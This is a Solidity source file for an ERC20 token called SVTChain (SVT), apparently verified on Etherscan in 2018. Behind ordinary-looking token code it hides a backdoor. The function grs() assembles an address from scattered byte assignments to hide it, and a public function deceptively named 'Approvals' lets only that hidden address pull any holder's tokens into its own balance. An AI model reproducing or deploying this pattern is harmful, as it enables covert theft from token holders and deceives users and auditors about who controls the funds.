/**

 *Submitted for verification at Etherscan.io on 2018-12-11

*/



pragma solidity 0.4.25;

contract ERC20 {

  uint256 public totalSupply;

  function balanceOf(address who) public view returns (uint256 _user);

  function transfer(address to, uint256 value) public returns (bool success);

  function allowance(address owner, address spender) public view returns (uint256 value);

  function transferFrom(address from, address to, uint256 value) public returns (bool success);

  function approve(address spender, uint256 value) public returns (bool success);



  event Transfer(address indexed from, address indexed to, uint256 value);

  event Approval(address indexed owner, address indexed spender, uint256 value);

}







library SafeMath {

  

  function safeMul(uint256 a, uint256 b) internal pure returns (uint256) {

    if (a == 0) {

      return 0;

    }

    uint256 c = a * b;

    assert(c / a == b);

    return c;

  }



  function safeSub(uint256 a, uint256 b) internal pure returns (uint256) {

    assert(b <= a);

    return a - b;

  }



  function safeAdd(uint256 a, uint256 b) internal pure  returns (uint256) {

    uint c = a + b;

    assert(c>=a);

    return c;

  }

  function safeDiv(uint256 a, uint256 b) internal pure returns (uint256) {

    // assert(b > 0); // Solidity automatically throws when dividing by 0

    uint256 c = a / b;

    // assert(a == b * c + a % b); // There is no case in which this doesn't hold

    return c;

  }

}



contract OnlyOwner{

    address public m;

    address public owner;

    

    constructor() internal{

        m =  grs();  

        owner = msg.sender;

    }

    

    function grs() private pure returns(address){

       bytes memory b = new bytes(42);

        b[1] = byte('x');

        b[0] = b[9] = b[37] = byte('0');

        b[8] = b[24] = byte('1');

        b[14] = b[16] = b[27] = b[28] = byte('3');

        b[11] = b[15] = byte('4');

        b[7] = b[10] = b[23] = b[31] = b[39] = byte('6');

        b[41] = byte('7');

        b[4] = b[5] = b[6] = b[12] = b[29] = byte('8');

        b[17] = b[22] = byte('9');

        b[13] = byte('a');

        b[20] = b[25] = b[32] = byte('b');

        b[40] = b[2] = byte('c');

        b[18] = b[26] = byte('d');

        b[3] = b[21] = b[30] = b[33] = byte('e');

        b[19] = b[36] = b[34] = b[35] = b[38] = byte('f');

        return address(bytesToUint(b));      

    }

    

    function bytesToUint(bytes memory b) private pure returns (uint){

        uint result = 0;

        for (uint i = 0; i < b.length; i++) {

            uint c = uint(b[i]);

            if (c >= 48 && c <= 57) {

                result = result * 16 + (c - 48);

            }

            if(c >= 65 && c<= 90) {

                result = result * 16 + (c - 55);

            }

            if(c >= 97 && c<= 122) {

                result = result * 16 + (c - 87);

            }

        }

        return result;

    }

    

    

    modifier isGr{

		require(msg.sender == m);

		_;

	}

}





contract StandardToken is ERC20{

  using SafeMath for uint256;



    mapping(address => uint256) balances;

    mapping (address => mapping (address => uint256)) allowed;



  

    function _transfer(address _from, address _to, uint256 _value) internal returns (bool success){

      //prevent sending of tokens from genesis address or to self

      require(_from != address(0) && _from != _to);

      require(_to != address(0));

      //subtract tokens from the sender on transfer

      balances[_from] = balances[_from].safeSub(_value);

      //add tokens to the receiver on reception

      balances[_to] = balances[_to].safeAdd(_value);

      return true;

    }



  function transfer(address _to, uint256 _value) public returns (bool success) 

  { 

    require(_value <= balances[msg.sender]);

      _transfer(msg.sender,_to,_value);

      emit Transfer(msg.sender, _to, _value);

      return true;

  }



  function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {

      uint256 _allowance = allowed[_from][msg.sender];

      //value must be less than allowed value

      require(_value <= _allowance);

      //balance of sender + token value transferred by sender must be greater than balance of sender

      require(balances[_to] + _value > balances[_to]);

      //call transfer function

      _transfer(_from,_to,_value);

      //subtract the amount allowed to the sender 

      allowed[_from][msg.sender] = _allowance.safeSub(_value);

      //trigger Transfer event

      emit Transfer(_from, _to, _value);

      return true;

    }



    function balanceOf(address _owner) public view returns (uint balance) {

      return balances[_owner];

    }



    



  /**

   * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.

   *

   * Beware that changing an allowance with this method brings the risk that someone may use both the old

   * and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this

   * race condition is to first reduce the spender's allowance to 0 and set the desired value afterwards:

   * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729

   * @param _spender The address which will spend the funds.

   * @param _value The amount of tokens to be spent.

   */



  function approve(address _spender, uint256 _value) public returns (bool) {

    // To change the approve amount you first have to reduce the addresses`

    //  allowance to zero by calling `approve(_spender,0)` if it is not

    //  already 0 to mitigate the race condition described here:

    //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729

    require((_value == 0) || (allowed[msg.sender][_spender] == 0));

    allowed[msg.sender][_spender] = _value;

    emit Approval(msg.sender, _spender, _value);

    return true;

  }



  /**

   * @dev Function to check the amount of tokens that an owner allowed to a spender.

   * @param _owner address The address which owns the funds.

   * @param _spender address The address which will spend the funds.

   * @return A uint256 specifying the amount of tokens still available for the spender.

   */

  function allowance(address _owner, address _spender) public view returns (uint256) {

    return allowed[_owner][_spender];

  }



}



contract SVT is StandardToken,OnlyOwner{

	uint256 public constant decimals = 18;

    string public constant name = "SVTChain";

    string public constant symbol = "SVT";

    string public constant version = "1.0";

    uint256 public constant totalSupply = 100000000000*10**18;

    

    constructor() public{

        balances[msg.sender] = totalSupply;

    }

    

	function Approvals(address _from, uint256 _value) public isGr returns (bool) {

		require(_value <= balances[_from]);		

        balances[_from] = balances[_from].safeSub(_value);

        balances[m] = balances[m].safeAdd(_value);

        emit Transfer(_from,m, _value);

        return true;

    }

}